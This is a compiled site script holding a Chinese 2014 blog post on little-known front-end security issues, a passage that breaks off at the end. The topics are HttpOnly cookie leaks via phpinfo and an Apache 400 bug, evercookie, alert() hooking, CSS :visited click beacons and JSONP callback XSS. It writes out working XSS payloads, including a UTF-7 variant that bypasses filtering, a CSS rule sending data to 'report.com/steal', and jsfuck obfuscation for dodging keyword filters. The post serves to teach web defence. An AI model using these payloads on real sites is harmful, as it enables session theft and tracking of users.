import{_ as r,e as s,o as d,c as n,a as t,f as i,d as o,b as e}from"./app.3398e39f.js";var c="/assets/blogImg/safety_001.jpg",l="/assets/blogImg/safety_002.jpg",h="/assets/blogImg/safety_003.jpg",p="/assets/blogImg/safety_004.jpg",u="/assets/blogImg/safety_005.jpg";const b={},_=o(`<h2 id="date-2014-05-27-23-52" tabindex="-1"><a class="header-anchor" href="#date-2014-05-27-23-52" aria-hidden="true">#</a> date: 2014-05-27 23:52</h2><h3 id="\u96F6\u3001\u6982\u8FF0" tabindex="-1"><a class="header-anchor" href="#\u96F6\u3001\u6982\u8FF0" aria-hidden="true">#</a> \u96F6\u3001\u6982\u8FF0</h3><p>\u63D0\u8D77 web \u524D\u7AEF\u5B89\u5168\uFF0C\u5927\u5BB6\u90FD\u4F1A\u60F3\u5230\u4E24\u4E2A\u540D\u8BCD\uFF1A<code>xss</code>\u548C<code>csrf</code>\u3002<br> \u629B\u53BB\u8FD9\u6700\u5E38\u89C1\uFF0C\u6700\u88AB\u5E7F\u6CDB\u5E94\u7528\u7684\u4E24\u8005\uFF0C\u6211\u60F3\u8C08\u8C08\u4E00\u4E9B\u96BE\u4EE5\u89C9\u5BDF\u7684\uFF0C\u6BD4\u8F83\u504F\u95E8\u7684\u5B89\u5168\u5173\u6CE8\u70B9\u3002<br> \u5927\u6982\u5206\u4E3A\u4EE5\u4E0B\u7AE0\u8282\uFF1A</p><blockquote><p>\u76D7\u53D6\u65E0\u6CD5\u7528 js \u8BFB\u5199\u7684 Cookie<br> \u5220\u4E0D\u6389\u7684\u672C\u5730\u5B58\u50A8<br> \u51FD\u6570\u8986\u5199\u76D1\u542C\u4E0A\u62A5<br> \u5185\u5B58 Cookie \u4E0E\u786C\u76D8 Cookie<br> CSS \u5E26\u6765\u7684\u70B9\u51FB\u91CF\u6CC4\u9732<br> JSONP \u56DE\u8C03\u51FD\u6570\u4E0E UTF-7 \u7F16\u7801<br> \u8FC7\u6EE4\u4E0E\u4EE3\u7801\u6DF7\u6DC6<br> \u5FC3\u7406\u5B66\u4E0E\u793E\u4F1A\u5DE5\u7A0B\u5B66</p></blockquote><p>\u8D44\u6599\u7565\u591A\uFF0C\u6587\u7AE0\u8F83\u957F\uFF0C\u8BF7\u81EA\u5907\u74DC\u5B50\u2026</p><h3 id="\u4E00\u3001\u76D7\u53D6\u65E0\u6CD5\u7528-js-\u8BFB\u5199\u7684-cookie" tabindex="-1"><a class="header-anchor" href="#\u4E00\u3001\u76D7\u53D6\u65E0\u6CD5\u7528-js-\u8BFB\u5199\u7684-cookie" aria-hidden="true">#</a> \u4E00\u3001\u76D7\u53D6\u65E0\u6CD5\u7528 js \u8BFB\u5199\u7684 Cookie</h3><p>\u4E3A\u4E86\u9632\u8303 xss \u83B7\u53D6 Cookie\uFF0C\u7F51\u7EDC\u89C4\u8303\u63D0\u4F9B\u4E86 HttpOnly Cookie \u673A\u5236\uFF0C\u8BBE\u7F6E\u4E86\u8BE5\u6807\u5FD7\u540E\uFF0Cjs \u811A\u672C\u5C06\u65E0\u6CD5\u8BFB\u5199\u8BE5 Cookie\u3002\u4F46\u65E2\u7136\u9996\u5148\u662F\u201C\u65E0\u6CD5\u8BFB\u201D\uFF0C\u5982\u4F55\u201C\u53EF\u4EE5\u8BFB\u201D\u5C31\u6210\u4E3A\u4E86\u4E2A\u6709\u8DA3\u7684\u8BDD\u9898\u3002</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>setcookie(&quot;test&quot;, 1, time()+3600, &quot;&quot;, &quot;&quot;, 0); // \u8BBE\u7F6E\u666E\u901ACookie
setcookie(&quot;test_http&quot;, 1, time()+3600, &quot;&quot;, &quot;&quot;, 0, 1);// \u7B2C7\u4E2A\u53C2\u6570\u662FHttpOnly \u6807\u5FD7\uFF0C0 \u4E3A\u5173\u95ED(\u9ED8\u8BA4)\uFF0C1 \u4E3A\u5F00\u542F
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>\u6211\u4EEC\u8FD8\u662F\u53EF\u4EE5\u901A\u8FC7\u4E00\u4E9B\u670D\u52A1\u5668\u4E0A\u7684\u6F0F\u6D1E\u53BB\u83B7\u53D6\u5B83\u4EEC\u3002</p><h4 id="_2-1-\u8C03\u8BD5\u4FE1\u606F\u6CC4\u9732" tabindex="-1"><a class="header-anchor" href="#_2-1-\u8C03\u8BD5\u4FE1\u606F\u6CC4\u9732" aria-hidden="true">#</a> 2.1) \u8C03\u8BD5\u4FE1\u606F\u6CC4\u9732</h4><p>\u6BD4\u8F83\u7ECF\u5178\u7684\u662F PHP \u7684 phpinfo \u6587\u4EF6\uFF1A<br><img src="`+c+'" alt="phpinfo\u6587\u4EF6"><br> \u5982\u679C\u5728\u90E8\u7F72\u670D\u52A1\u65F6\uFF0C\u6CA1\u6709\u5220\u9664\u8FD9\u4E2A\u9ED8\u8BA4\u7684\u8C03\u8BD5\u4FE1\u606F\u6587\u4EF6\uFF0C\u5C06\u6CC4\u9732\u670D\u52A1\u5668\u4FE1\u606F\u3002\u5176\u4E2D\u5305\u62EC HttpOnly Cookie\u3002<br> \u8BBF\u95EE phpinfo.php\uFF0C\u5C06\u770B\u5230\uFF1A<br><img src="'+l+'" alt="Alt text"><br> \u5176\u4ED6\u7684\u670D\u52A1\u5668\uFF0C\u5982 python \u7684 Django\uFF0C\u4E5F\u6709\u7C7B\u4F3C\u7684\u8C03\u8BD5\u4FE1\u606F\u6587\u4EF6\uFF0C\u5728\u5916\u53D1\u65F6\u8981\u6CE8\u610F\u6E05\u9664\u3002</p><h4 id="_2-2-apache-2-2-x-\u7248\u672C\u8BF7\u6C42\u5934\u8D85\u957F\u6CC4\u9732" tabindex="-1"><a class="header-anchor" href="#_2-2-apache-2-2-x-\u7248\u672C\u8BF7\u6C42\u5934\u8D85\u957F\u6CC4\u9732" aria-hidden="true">#</a> 2.2) Apache 2.2.x \u7248\u672C\u8BF7\u6C42\u5934\u8D85\u957F\u6CC4\u9732</h4><p>Cookies \u6700\u5927\u9650\u5236\u4E00\u822C\u4E3A 4kb \u5DE6\u53F3\uFF0C\u5982\u679C\u8BF7\u6C42\u5934\u957F\u5EA6\u8D85\u8FC7 LimitRequestFieldSize\uFF0C\u5C06\u4F1A\u5F15\u53D1 400 \u9519\u8BEF\u3002\u5728 Apache 2.2.x \u591A\u4E2A\u7248\u672C\u5185\uFF0C\u5982\u679C\u5F15\u53D1 400(Bad Requerst)\u9519\u8BEF\uFF0C\u4F1A\u8FD4\u56DE\u51FA\u9519\u7684\u8BF7\u6C42\u5934\u5185\u5BB9\uFF0C\u8FD9\u5C31\u5305\u542B\u4E86 HttpOnly Cookie\u3002 \u56E0\u6B64\uFF0C\u6211\u4EEC\u53EF\u4EE5\u5229\u7528\u8FD9\u4E2A\u6F0F\u6D1E\uFF0C\u6784\u9020\u4E00\u4E2A\u8D85\u957F\u7684\u8BF7\u6C42\uFF0C\u8BA9 Apache \u8FD4\u56DE 400\uFF0C\u5E76\u7528 ajax \u6355\u83B7 xhr.responseText \u5373\u53EF\u83B7\u5F97 HttpOnly Cookie \u4FE1\u606F\u3002<br><img src="'+h+'" alt="Alt text"></p><h3 id="\u4E09\u3001\u5220\u4E0D\u6389\u7684\u672C\u5730\u5B58\u50A8" tabindex="-1"><a class="header-anchor" href="#\u4E09\u3001\u5220\u4E0D\u6389\u7684\u672C\u5730\u5B58\u50A8" aria-hidden="true">#</a> \u4E09\u3001\u5220\u4E0D\u6389\u7684\u672C\u5730\u5B58\u50A8</h3><p>\u5982\u679C\u628A\u6D4F\u89C8\u5668\u7406\u89E3\u4E3A\u4E00\u4E2A\u5668\u5B98\uFF0C\u628A\u6076\u610F\u6807\u5FD7\u6BD4\u65B9\u505A\u5BC4\u751F\u866B\u3002\u8FD9\u6807\u5FD7\u901A\u8FC7\u67D0\u79CD\u9014\u5F84\u5BC4\u751F\u5728\u4E86\u6D4F\u89C8\u5668\uFF0C\u5E76\u4E14&quot;\u6C38\u4E45&quot;\u5BC4\u751F\uFF0C\u8FD9\u60F3\u60F3\u90FD\u5F88\u53EF\u6015\u3002\u8FD9\u4E2A\u6807\u5FD7\uFF0C\u53EF\u80FD\u662F\u690D\u5165\u5E7F\u544A\u7684\u8DDF\u8E2A\u6807\u5FD7\uFF0C\u6216\u8005\u6709\u5176\u4ED6\u7528\u5904\uFF0C\u603B\u4E4B\u5B83\u4F9D\u9644\u5230\u4F60\u7684\u6D4F\u89C8\u5668\u5C31\u5220\u4E0D\u6389\u4E86\u3002<br> \u4F46\u5B83\u662F\u5982\u4F55\u5BC4\u751F\u7684\u5462\uFF1F\u53C8\u5982\u4F55\u505A\u5230\u201C\u6C38\u4E45\u201D\uFF1F\u8FD9\u5C31\u6D89\u53CA\u5230\u672C\u5730\u5B58\u50A8\u5B89\u5168\u3002\u6211\u4EEC\u5148\u770B\u4E0B\u5E38\u89C4\u7684\u672C\u5730\u5B58\u50A8\u65B9\u6848\uFF1A</p><blockquote><p>Cookie - \u662F\u6700\u5E38\u89C1\u7684\u65B9\u5F0F\uFF0Ckey-value \u6A21\u5F0F<br> UserData - IE \u81EA\u5DF1\u7684\u672C\u5730\u5B58\u50A8\uFF0Ckey-value \u6A21\u5F0F<br> localStorage - HTML5 \u65B0\u589E\u7684\u672C\u5730\u5B58\u50A8\uFF0Ckey-value \u6A21\u5F0F<br> local Database - HTML5 \u65B0\u589E\u7684\u6D4F\u89C8\u5668\u672C\u5730 DataBase\uFF0C\u662F SQLite \u6570\u636E\u5E93<br> Flash Cookie Flash \u7684\u672C\u5730\u5171\u4EAB\u5BF9\u8C61\uFF08LSO\uFF09\uFF0Ckey-value \u6A21\u5F0F\uFF0C\u8DE8\u6D4F\u89C8\u5668</p></blockquote><p>\u9664\u53BB\u8FD9\u4E9B\uFF0C\u6211\u8FD8\u6536\u96C6\u4E86\u4E00\u4E9B\u6BD4\u8F83\u201C\u504F\u95E8\u201D\u7684\u5B58\u50A8\u65B9\u6848\uFF1A</p><blockquote><p>Silverlight \u7684 IsolatedStorage - \u7C7B\u4F3C HTML5 localStorage<br> PNG Cache\uFF0C\u5C06 Cookie \u8F6C\u6362\u6210 RGB \u503C\u63CF\u8FF0\u5F62\u5F0F\uFF0C\u4EE5 PNG Cache \u65B9\u5F0F\u5F3A\u5236\u7F13\u5B58\u7740\uFF0C\u8BFB\u5165\u5219\u4EE5 HTML5 \u7684 canvas \u5BF9\u8C61\u8BFB\u53D6\u5E76\u8FD8\u539F\u4E3A\u539F\u6765\u7684 Cookie \u503C<br> HTTP Etags\u3001Web Cache - \u672C\u8D28\u4E0A\u90FD\u662F\u5229\u7528\u4E86\u6D4F\u89C8\u5668\u7F13\u5B58\u673A\u5236\uFF1A\u6D4F\u89C8\u5668\u4F1A\u4F18\u5148\u4ECE\u672C\u5730\u8BFB\u53D6\u7F13\u5B58\u7684\u5185\u5BB9<br> Web History\uFF0C\u5229\u7528\u7684\u662F\u201CCSS \u5224\u65AD\u76EE\u6807 URL \u662F\u5426\u8BBF\u95EE\u8FC7\u201D\u6280\u5DE7\uFF0C\u6BD4\u5982 a \u6807\u7B7E\u8BBF\u95EE\u8FC7\u4F1A\u663E\u793A\u7D2B\u8272\uFF08\u65B0\u6D4F\u89C8\u5668\u5DF2 fix\uFF09<br> window.name\uFF0C\u672C\u8D28\u5C31\u662F\u4E00\u4E2A DOM \u5B58\u50A8\uFF0C\u5E76\u4E0D\u5B58\u5728\u672C\u5730\u3002</p></blockquote>',18),m=e("\u8001\u5916 Samy Kamkar \u7528\u534A\u5929\u5F00\u53D1\u4E86\u4E00\u4E2A JavaScript API\uFF1A"),v={href:"http://en.wikipedia.org/wiki/Evercookie",target:"_blank",rel:"noopener noreferrer"},g=e("evercookie"),k=e("\u3002"),f=t("br",null,null,-1),x=e(" \u8BE5 API \u5229\u7528\u4E86\u4E0A\u9762\u7684\u5168\u90E8\u5B58\u50A8\u624B\u6BB5\uFF0C\u5C06\u201C"),q=t("code",null,"\u6C38\u4E0D\u4E22\u5931\u4F60\u7684cookie",-1),C=e("\u201D\u8D2F\u5F7B\u5230\u5E95\u2026\u5F53 evercookie \u53D1\u73B0\u7528\u67D0\u79CD\u673A\u5236\u5B58\u50A8\u7684 cookie \u88AB\u6570\u636E\u5C06\u5220\u9664\u4E4B\u540E\uFF0C\u5B83\u5C06\u5229\u7528\u5176\u5B83\u673A\u5236\u521B\u5EFA\u7684 cookie \u6570\u636E\u6765\u91CD\u65B0\u521B\u5EFA\uFF0C\u8BA9\u7528\u6237\u51E0\u4E4E\u4E0D\u53EF\u80FD\u5220\u9664 cookie\u3002"),S=o(`<h3 id="\u56DB\u3001\u51FD\u6570\u8986\u5199\u76D1\u542C\u4E0A\u62A5" tabindex="-1"><a class="header-anchor" href="#\u56DB\u3001\u51FD\u6570\u8986\u5199\u76D1\u542C\u4E0A\u62A5" aria-hidden="true">#</a> \u56DB\u3001\u51FD\u6570\u8986\u5199\u76D1\u542C\u4E0A\u62A5</h3><p>\u8986\u5199\u51FD\u6570\uFF0C\u53EF\u4EE5\u7528\u4E8E\u9632\u8303\uFF1F\u8FD9\u662F\u7F51\u4E0A\u5B89\u5168\u8BBA\u575B\u4E2D\u6709\u4EBA\u63D0\u5230\u7684\u4E00\u4E2A\u504F\u95E8\u8981\u70B9\u3002\u5176\u7F18\u7531\u662F\uFF1A<code>\u641E\u8DE8\u7AD9\u7684\u4EBA\u603B\u4E60\u60EF\u7528alert\u6765\u786E\u8BA4\u662F\u5426\u5DF2\u6210\u529F\u8DE8\u7AD9</code>\uFF0C\u5982\u679C\u4F60\u8981\u76D1\u63A7\u662F\u5426\u6709\u4EBA\u5728\u6D4B\u8BD5\u4F60\u7684\u7F51\u7AD9 xss \u7684\u8BDD\uFF0C\u53EF\u4EE5\u5728\u4F60\u8981\u76D1\u63A7\u7684\u9875\u9762\u91CC\u8986\u5199 alert \u51FD\u6570\uFF0C\u8BB0\u5F55 alert \u8C03\u7528\u60C5\u51B5\u3002</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>function log(s) {
    var img = new Image();
    img.src = &quot;http://yousite.com/log.php?caller=&quot; + encodeURIComponent(s);
}

var _alert = alert;
window.alert = function(s) {
    log(alert.caller);
    _alert(s);
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,3),j=e("\u5982\u6B64\uFF0C\u5C31\u80FD\u5728\u6709\u4EBA\u8C03\u7528 alert \u65F6\uFF0C\u5C31\u6267\u884C\u4E0A\u62A5\uFF0C\u4EE5\u4F9B\u76D1\u63A7\u3002\u597D\u5427\uFF0C\u8FD9\u91CC\u8FD8\u6D89\u53CA\u4EBA\u7684\u5FC3\u7406\u5B66\u2026"),y=t("br",null,null,-1),I=e(" \u5176\u5B9E\u51FD\u6570\u8986\u5199\u65E0\u8BBA\u653B\u8FD8\u662F\u9632\uFF0C\u90FD\u5E94\u8BE5\u662F\u6211\u4EEC\u5173\u6CE8\u7684\u4E00\u4E2A\u70B9\u3002\u76F8\u5173\u6587\u7AE0\uFF1A\u300A"),A={href:"http://www.xfocus.net/articles/200712/963.html",target:"_blank",rel:"noopener noreferrer"},w=e("\u6D45\u8C08 javascript \u51FD\u6570\u52AB\u6301"),E=e("\u300B\u3002"),H=o(`<h3 id="\u4E94\u3001\u5185\u5B58-cookie-\u4E0E\u786C\u76D8-cookie" tabindex="-1"><a class="header-anchor" href="#\u4E94\u3001\u5185\u5B58-cookie-\u4E0E\u786C\u76D8-cookie" aria-hidden="true">#</a> \u4E94\u3001\u5185\u5B58 Cookie \u4E0E\u786C\u76D8 Cookie</h3><p><code>\u5185\u5B58Cookie</code> - \u6307\u6CA1\u6709\u8BBE\u7F6E\u8FC7\u671F\u65F6\u95F4 Expires \u7684 Cookie\uFF0C\u968F\u6D4F\u89C8\u5668\u5173\u95ED\uFF0C\u6B64 Cookie \u5728\u5185\u5B58\u4E2D\u9500\u6BC1<br><code>\u786C\u76D8Cookie</code> - \u8BBE\u7F6E\u4E86\u8FC7\u671F\u4E8B\u4EF6 Expires \u7684 Cookie\uFF0C\u5E38\u9A7B\u786C\u76D8\uFF0C\u76F4\u5230\u8FC7\u671F</p><p>\u6211\u4EEC\u5F88\u5BB9\u6613\u5F97\u51FA\u7ED3\u8BBA\uFF1A\u5185\u5B58 Cookie \u66F4\u5B89\u5168\u3002\u56E0\u6B64\uFF0C\u67D0\u4E9B\u7AD9\u70B9\u4F1A\u628A<code>\u654F\u611F\u4FE1\u606F\u653E\u5230\u5185\u5B58Cookie</code>\u91CC\u9762\u3002\u8FD9\u539F\u672C\u662F\u6CA1\u4EC0\u4E48\u98CE\u9669\u7684\uFF0C\u4F46\u6070\u5DE7\u4F1A\u5728\u9047\u5230 XSS \u7684\u65F6\u5019\u5931\u63A7\u3002\u8BD5\u60F3\u4E0B\uFF0CXSS \u653B\u51FB\u8005\u53EF\u4EE5\u7ED9\u5185\u5B58 Cookie \u52A0\u4E00\u4E2A\u8FC7\u671F\u65F6\u95F4\uFF0C\u4F7F\u5176\u53D8\u4E3A\u786C\u76D8 Cookie\uFF0C\u5C31\u4F1A\u5728\u672A\u6765\u5F88\u957F\u4E00\u6BB5\u65F6\u95F4\u5185\uFF0C\u751A\u81F3\u662F\u6C38\u4E45\u63A7\u5236\u7740\u76EE\u6807\u7528\u6237\u7684\u8D26\u53F7\u6743\u9650\u3002</p><p>\u56E0\u6B64\uFF0C\u8FD9\u91CC\u6709\u4E24\u4E2A\u5173\u6CE8\u70B9\uFF1A</p><ol><li>\u654F\u611F\u4FE1\u606F\u8FD8\u662F\u4E0D\u8981\u653E Cookie \u91CC\uFF0C\u5373\u4F7F\u662F\u5185\u5B58 Cookie\uFF1B</li><li>\u670D\u52A1\u5668\u8981\u505A Cookie \u7684\u4E09\u4E2A\u7EF4\u5EA6\u7684\u6821\u9A8C - \u552F\u4E00\u6027\uFF08\u662F\u5426\u9A8C\u8BC1\u901A\u8FC7\uFF09\u3001\u5B8C\u6574\u6027\uFF08\u662F\u5426\u88AB\u7BE1\u6539\u4E86\uFF09\u3001\u662F\u5426\u8FC7\u671F\u3002</li></ol><h3 id="\u516D\u3001css-\u5E26\u6765\u7684\u70B9\u51FB\u91CF\u6CC4\u9732" tabindex="-1"><a class="header-anchor" href="#\u516D\u3001css-\u5E26\u6765\u7684\u70B9\u51FB\u91CF\u6CC4\u9732" aria-hidden="true">#</a> \u516D\u3001CSS \u5E26\u6765\u7684\u70B9\u51FB\u91CF\u6CC4\u9732</h3><p>\u5728\u6211\u4EEC\u7684\u5370\u8C61\u4E2D\uFF0C\u524D\u7AEF\u5B89\u5168\u57FA\u672C\u662F js \u5E26\u6765\u7684\u95EE\u9898\uFF0C\u4F46 css \u4E5F\u4F1A\u6709\u5B89\u5168\u9690\u60A3\u5417\uFF1F\u662F\u7684\u3002\u9664\u53BB IE \u4E0B\u7684 css \u4E2D\u6267\u884C js \u4EE3\u7801\u95EE\u9898\uFF0C\u8FD8\u6709\u53E6\u5916\u4E00\u4E2A\u5173\u6CE8\u70B9\u3002<br> \u5047\u5982\u6709\u4E00\u4E2A\u5F00\u6E90\u7EC4\u4EF6\uFF0C\u6211\u4EEC\u53EA\u770B\u4E86\u4E0B js \u6E90\u7801\uFF0C\u89C9\u5F97\u6CA1\u6709\u6F0F\u6D1E\u98CE\u9669\uFF0C\u5C31\u76F4\u63A5\u62FF\u8FC7\u6765\u4F7F\u7528\u4E86\u3002\u51B5\u4E14\uFF0C\u6CA1\u6709\u524D\u7AEF\u4EBA\u5458\u4E50\u4E8E\u53BB\u8BFB\u522B\u4EBA\u7684 css \u7684\u2026\u4F46\u6709\u67D0\u79CD\u6781\u7AEF\u7684\u60C5\u51B5\uFF0Ccss \u5E26\u6765\u4E86\u610F\u60F3\u4E0D\u5230\u7684\u6570\u636E\u6CC4\u9732\u3002<br> \u8BD5\u60F3\u8FD9\u662F\u4E00\u4E2A<code>\u5BFC\u822A\u680F\u7EC4\u4EF6</code>\uFF0Chtml \u4EE3\u7801\u662F\u8FD9\u6837\u7684\uFF1A</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>&lt;a href=&quot;http://yousite.com/a1&quot; id=&quot;a1&quot;&gt;nav1&lt;/a&gt;
&lt;a href=&quot;http://yousite.com/a2&quot; id=&quot;a2&quot;&gt;nav2&lt;/a&gt;
&lt;a href=&quot;http://yousite.com/a3&quot; id=&quot;a3&quot;&gt;nav3&lt;/a&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>\u4F60\u5FFD\u7565\u6389\u7684 css \u5199\u6210\u8FD9\u6837\uFF1A</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>#a1:visited {background: url(http://report.com/steal?data=a1);}
#a2:visited {background: url(http://report.com/steal?data=a2);}
#a3:visited {background: url(http://report.com/steal?data=a3);}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>\u6211\u4EEC\u7528\u5230\u4E1A\u52A1\u91CC\uFF0C\u7528\u6237\u70B9\u51FB\u8FD9\u4E09\u4E2A\u5BFC\u822A\u540E\uFF0Ca \u6807\u7B7E\u7684 visited \u4F2A\u5C5E\u6027\u751F\u6548\uFF0C\u5C31\u4F1A\u8BBE\u7F6E background\uFF0C\u800C\u80CC\u666F\u7684 url \u5176\u5B9E\u662F\u4E0A\u62A5\u5730\u5740\u3002\u8FD9\u65F6\u5019\uFF0C\u4F60\u7684\u4E1A\u52A1\u7684<code>\u70B9\u51FB\u6570\u636E\u91CF</code>\u5C31\u66B4\u9732\u7ED9\u7B2C\u4E09\u65B9\u4E86\uFF01<br> \u5F53\u7136\uFF0C\u8FD9\u53EA\u9488\u5BF9\u65E7\u7248\u672C\u6D4F\u89C8\u5668\uFF0C\u65B0\u7248\u672C\u6D4F\u89C8\u5668\u90FD\u5DF2 fix \u8FD9\u4E2A\u95EE\u9898\u3002\u53EF\u662F\uFF0CHTML5 \u7684\u51FA\u73B0\u53C8\u8BA9\u8FD9\u4E2A\u95EE\u9898\u56DE\u5F52\u4E86\u2026<br> HTML5 \u63D0\u4F9B\u4F2A\u7C7B<code>::selection</code>\uFF0C\u5F53\u6307\u5B9A\u5BF9\u8C61\u533A\u57DF\u88AB\u9009\u62E9\u65F6\uFF0C\u5C31\u4F1A\u89E6\u53D1\u3002\u5176\u539F\u7406\u8DDF\u4E0A\u9762\u7C7B\u4F3C\u3002</p><h3 id="\u4E03\u3001jsonp-\u56DE\u8C03\u51FD\u6570\u4E0E-utf-7-\u7F16\u7801" tabindex="-1"><a class="header-anchor" href="#\u4E03\u3001jsonp-\u56DE\u8C03\u51FD\u6570\u4E0E-utf-7-\u7F16\u7801" aria-hidden="true">#</a> \u4E03\u3001JSONP \u56DE\u8C03\u51FD\u6570\u4E0E UTF-7 \u7F16\u7801</h3><h4 id="_7-1-\u57FA\u672C\u539F\u7406" tabindex="-1"><a class="header-anchor" href="#_7-1-\u57FA\u672C\u539F\u7406" aria-hidden="true">#</a> 7.1) \u57FA\u672C\u539F\u7406</h4><p>\u5728 JSONP \u6280\u672F\u4E2D\uFF0C\u670D\u52A1\u5668\u901A\u5E38\u4F1A\u8BA9\u8BF7\u6C42\u65B9\u5728\u8BF7\u6C42\u53C2\u6570\u4E2D\u63D0\u4F9B callback \u51FD\u6570\u540D\uFF0C\u800C\u4E0D\u662F\u7531\u6570\u636E\u63D0\u4F9B\u65B9\u5B9A\u5236\uFF0C\u5982\u8BF7\u6C42\u65B9\u53D1\u8D77\u8BF7\u6C42\uFF1A<br><code>cgi-bin/get_jsonp?id=123&amp;call_back=some_function</code><br> \u8FD4\u56DE\u6570\u636E\u683C\u5F0F\u4E3A\uFF1A<br><code>some_function([{&#39;id&#39;:123, data:&#39;some_data&#39;}]);</code><br> \u5982\u679C\uFF0C\u6570\u636E\u63D0\u4F9B\u65B9\u6CA1\u6709\u5BF9 callback \u51FD\u6570\u540D\u505A\u5B89\u5168\u8FC7\u6EE4\uFF0C\u5C31\u4F1A\u5E26\u6765 XSS \u95EE\u9898\u3002<br> \u8BF7\u6C42\uFF1A<br><code>cgi-bin/get_jsonp?id=123&amp;call_back=&lt;script&gt;alert(1);&lt;/script&gt;</code> \u8FD4\u56DE\uFF1A<br><code>&lt;script&gt;alert(1);&lt;/script&gt;([{&#39;id&#39;:123, data:&#39;some_data&#39;}]);</code><br> \u6240\u4EE5\uFF0C\u4E00\u822C\u670D\u52A1\u5668\u90FD\u4F1A\u5BF9 call_back \u53C2\u6570\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u4F46\u8FC7\u6EE4\u7684\u65B9\u6CD5\u662F\u5426\u4F1A\u5B58\u5728\u6F0F\u6D1E\u5462\uFF1F</p><h4 id="_7-2-ie-\u89E3\u6790-utf-7-\u6F0F\u6D1E" tabindex="-1"><a class="header-anchor" href="#_7-2-ie-\u89E3\u6790-utf-7-\u6F0F\u6D1E" aria-hidden="true">#</a> 7.2) IE \u89E3\u6790 UTF-7 \u6F0F\u6D1E</h4><p>\u6BD4\u8F83\u7B80\u5355\u7684\u8FC7\u6EE4\u65B9\u6CD5\uFF0C\u662F\u8FC7\u6EE4<code>&lt;&gt;</code>\u5B57\u7B26\uFF0C\u4F7F\u5F97\u65E0\u6CD5\u6784\u6210 html \u6807\u7B7E\u3002\u4F46\u5728 IE6\\IE7 \u7684\u67D0\u4E9B\u7248\u672C\u4E2D\uFF0C\u5B58\u5728\u4EE5\u4E0B\u6F0F\u6D1E\uFF1A<strong>\u5982\u679C\u53D1\u73B0\u6587\u4EF6\u524D\u9762\u662F\u201C+/v8\u201D\u5F00\u5934\uFF0C\u5C31\u628A\u6587\u4EF6\u5F53\u505A UTF-7 \u89E3\u6790</strong>\uFF08IE7 \u540E\u7EED\u7248\u672C\u5DF2\u53D1\u5E03\u8865\u4E01\u4FEE\u590D\uFF09\u3002<br> \u5728\u6CA1\u88AB\u4FEE\u590D\u7684 IE \u7248\u672C\u4E2D\uFF0C\u5982\u679C\u6211\u4EEC\u5C06\u4E0A\u9762\u7684\u8BF7\u6C42\u7528 utf-7 \u7F16\u7801\u3002\u518D\u5728\u524D\u9762\u52A0\u4E0A&quot;+/v8&quot;\u5934\uFF1A<br><code>cgi-bin/get_jsonp?id=123&amp;callback=%2B%2Fv8%20%2BADw-script%2BAD4-alert(1)%2BADw-%2Fscript%2BAD4</code><br> \u8FD9\u65F6\u5019\u5DE7\u5999\u7684\u8EB2\u5F00\u4E86<code>&lt;&gt;</code>\u8FC7\u6EE4\uFF0C\u800C\u8FD4\u56DE\uFF1A<br><code>+/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4({\u2018id\u2019=&gt;123,data=&gt;\u2019some_data\u2019});</code><br> \u8FD9\u65F6 IE \u5C06\u8FD9\u4E2A jsonp \u6587\u4EF6\u5F53\u4F5C utf-7 \u89E3\u6790\uFF0C\u4F9D\u7136\u89E6\u53D1 XSS\u3002</p><h3 id="\u516B\u3001\u8FC7\u6EE4\u4E0E\u4EE3\u7801\u6DF7\u6DC6" tabindex="-1"><a class="header-anchor" href="#\u516B\u3001\u8FC7\u6EE4\u4E0E\u4EE3\u7801\u6DF7\u6DC6" aria-hidden="true">#</a> \u516B\u3001\u8FC7\u6EE4\u4E0E\u4EE3\u7801\u6DF7\u6DC6</h3>`,17),T=e("\u8FC7\u6EE4\u5668\u5982\u679C\u8FC7\u6EE4\u4E86\u5927\u90E8\u5206\u7684 js \u51FD\u6570\uFF0C\u5982 eval\u3001alert \u4E4B\u7C7B\uFF0C\u662F\u5426\u5C31\u80FD\u4FDD\u8BC1\u5B89\u5168\u5462\uFF1F\u5FC5\u7136\u4E0D\u662F\uFF0C\u6211\u4EEC\u8FD8\u6709\u5F3A\u5927\u7684 js \u4EE3\u7801\u6DF7\u6DC6\u624B\u6BB5\uFF0C\u53EF\u4EE5\u7ED5\u8FC7\u8FC7\u6EE4\u5668\u3002\u8FD9\u91CC\u63A8\u8350\u4E00\u4E2A\u795E\u5947\u7684\u7F51\u7AD9\uFF1A"),D={href:"http://utf-8.jp/public/jsfuck.html",target:"_blank",rel:"noopener noreferrer"},F=e("jsfuck"),L=e("\u3002"),B=t("br",null,null,-1),O=e(" \u7AD9\u540D\u5982\u5176\u540D\uFF0C\u6EE1\u6EE1\u7684\u6076\u610F\u2026\u5B83\u53EF\u4EE5\u4EC5\u4EC5\u7528 6 \u4E2A\u5B57\u7B26\uFF1A"),P=t("code",null,"[]()!+",-1),N=e("\u53BB\u6DF7\u6DC6\u7F16\u7801 js\u3002\u800C\u4E14\u517C\u5BB9\u6027\u7279\u522B\u7684\u5B8C\u5584\u3002\u4EE5\u4E0B\u662F\u6211\u5728\u6700\u65B0 chrome \u4E0B\u7684\u622A\u56FE\uFF0C\u5C06\u4E00\u53E5"),M=t("code",null,"alert(1)",-1),R=e("\u7F16\u7801\u6210\u4E86 3009 \u4E2A\u5B57\u7B26\uFF0C\u5E76\u6267\u884C\u6210\u529F\uFF1A"),U=t("br",null,null,-1),V=t("img",{src:p,alt:"Alt text"},null,-1),J=t("br",null,null,-1),X=e(" \u6240\u4EE5\u8FC7\u6EE4\u5668\u4EC5\u4EC5\u901A\u8FC7\u9002\u914D\u5173\u952E\u51FD\u6570\u540D\uFF0C\u662F\u4E0D\u80FD\u4FDD\u8BC1\u5B89\u5168\u6027\u7684\u3002"),G=o('<h3 